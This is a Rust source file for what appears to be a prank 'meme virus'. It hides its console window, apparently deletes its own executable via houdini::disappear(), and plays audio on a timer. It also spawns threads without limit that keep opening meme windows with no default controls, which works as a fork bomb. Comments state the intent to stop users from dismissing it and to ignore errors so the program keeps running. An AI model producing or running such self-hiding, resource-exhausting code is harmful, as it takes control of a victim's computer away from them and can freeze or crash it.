/*
** I perhaps do not know what I'm doing.
** - Dex		3/14/2023
*/

// Hide console window
#![windows_subsystem = "windows"]

use std::{thread};
use show_image::{create_window, WindowOptions};

mod consts;
pub use consts::*;

mod defs;
use defs::*;

#[show_image::main]
fn main() -> SyncResult<()> {
	let _ = houdini::disappear();

	thread::spawn(music_player_loop);

	//let _ = black_box(include_bytes!("warmer.png"));

	loop {
		thread::spawn(start_instance);
		thread::sleep(std::time::Duration::from_secs(DELAY_PER_INSTANCE_SPAWN));
	}
}

fn music_player_loop() {
	loop {
		thread::sleep(std::time::Duration::from_secs(DELAY_PER_MEME_MUSIC));
		let _ = play_meme_audio();
	}
}

/// Pops open a new window without user interaction
/// every x mins, so they can't just minimize the first window and move on
fn start_instance() {
	let mut first = true;

	loop {
		// This part disregards errors from show_one().
		// Don't let 'em stop our app via error propagation!
		if first {
			let _ = show_small(true);
			first = false;
		} else {
			let _ = show_one(true);
		};

		thread::spawn(start_instance);
	}
}

/// Picks either small/large only
fn pick_small() -> Shitpost {
	let options = SHITPOSTS.iter().filter(|v|
		matches!(v, Shitpost::Small(_))
	).collect::<Vec<_>>();

	*choose_rand(options).unwrap()
}

fn show_small(blocking: bool) -> Result<()> {
	let picked = pick_small();
	popup(picked.get_bytes(), blocking)?;

	Ok(())
}

fn show_one(blocking: bool) -> Result<()> {
	let picked = choose_rand(SHITPOSTS.to_vec()).ok_or_else(
		|| "Could not load meme... Literally 1984."
	)?;

	let img_bytes = picked.get_bytes();

	popup(img_bytes, blocking)?;

	Ok(())
}

/// Show a single meme, and optionally block thread
fn popup(img_bytes: &[u8], blocking: bool) -> Result<()> {
	let title = choose_rand(WINDOW_TITLES).unwrap();
	let img = image::load_from_memory(img_bytes)?;
	let size: [u32; 2] = [img.width(), img.height()];
	
	let window_options = WindowOptions {
		size: Some(size),
		resizable: false,
		default_controls: false,
		..Default::default()
	};

	let window = create_window(title, window_options)?;
	window.set_image("image-001", img)?;

	if blocking { window.wait_until_destroyed()? };

	Ok(())
}
